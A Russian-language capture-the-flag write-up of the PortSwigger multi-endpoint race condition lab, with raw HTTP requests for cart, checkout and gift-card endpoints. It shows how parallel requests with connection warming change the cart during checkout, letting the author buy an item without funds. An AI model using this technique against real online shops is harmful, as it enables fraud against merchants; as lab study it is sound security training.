---
title: "Multi-endpoint race conditions"
date: 2025-11-27
tags: [web, writeup, race-conditions]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint"
classes: wide
---	

Лаба содержит уязвимость `Race condition`. Для решения необходимо купить `Lightweight L33t Leather Jacket`. Для входу в учетку есть креды `wiener`:`peter`.

```
https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net/
```

# Solution

Зайду в аккаунт, чтобы иметь возможность совершать покупку. Я богат) У меня есть целая 100) К сожалению кнопки "Обналичить" я не нашел. Буду решать дальше.

На странице есть форма для использования подарочных карт, так что буду экспериментировать с ними. Попробую купить одну.

Добавления товара в корзину:

```http
Host: 0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Cookie: session=6FqUZpszxavpOLF0odugvWbDPJnX5zNA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=2&redir=PRODUCT&quantity=1
```

Совершить покупку:

```http
POST /cart/checkout HTTP/2
Host: 0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Cookie: session=6FqUZpszxavpOLF0odugvWbDPJnX5zNA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net/cart
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=zQVUMUPYwzod55uYusBzWUx9JVYOIwgx
```

Подарочный код:

```
V0nIv1JfdD
```

Получить корзину можно с помощью запроса `/cart`:

```http
GET /cart HTTP/2
Host: 0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Cookie: session=6FqUZpszxavpOLF0odugvWbDPJnX5zNA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Попробую поотправлять пакеты группами на добавление товаров в корзину через `Burp Repeater`. Я понял, что несколько товаров можно добавить, отправив запросы параллельно.

У меня появилась идея ввести купленный номер подарочной карты, чтобы получить запрос. Затем отправить его в репитер и попробовать отправить группу таких запросов с другим кодом. Итак, вот сам запрос:

```http
POST /gift-card HTTP/2
Host: 0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Cookie: session=6FqUZpszxavpOLF0odugvWbDPJnX5zNA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: https://0a3f00190421b8c3807cf3410012000a.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=zQVUMUPYwzod55uYusBzWUx9JVYOIwgx&gift-card=V0nIv1JfdD
```

Теперь куплю еще один и протестирую свою идею:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"Invalid gift card"
```

К сожалению, я получил ошибку. Поробую отправить запросы другим способом. 

И все еще не работает. Нужно думать дальше(

Попробую отправить запрос на добавление в корзину и покупку вместе. С трех попыток я увидел, что запрос на покупку обрабатывается гораздо быстрее, чем на добавление в корзину. `~350` против `~80` миллисекунд. Выглядит это странно. Попробую использовать `Connection warming`. Для этого добавлю `GET`-запрос к `/`, чтобы посмотреть, изменится ли время ответа. И да, это помогло. теперь время ответа `~65` и `~82`.

Верну купоны, чтобы восстановить деньги. А что, если добавить один товар в корзину, затем отправить запрос на подтверждение покупки, а в этот же момент оправить еще несколько запросов на добавление товаров в корзину? Нужно пробовать. 

Добавлю нужный мне товар `Lightweight L33t Leather Jacket` и отправлю их параллельно. 

И это сработало)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_multi-endpoint/1.png){: height="200" .align-center}

Давайте разберем, что произошло:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_multi-endpoint/2.png){: height="200" .align-center}

В корзине был один товар - `Gitf Card`. Я одновременно отправил запросы на добавление товара в корзину и подтверждение покупки. Запрос на подтверждение покупки пришел раньше и началась его обработка. На этом этапе в корзине только один товар. Далее пришел запрос на добавление еще одного товара в корзину. Он был обработан быстрее, чем запрос на подтверждение покупки. Таким образом товары в корзине были изменены. Теперь в корзине находятся `Gitf Card` и `Jacket`. Запрос на подтверждение покупки завершился позже и произошла покупка товаров из корзины. Это позволило приобрести товар и увести баланс в минус)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_multi-endpoint/3.png){: height="200" .align-center}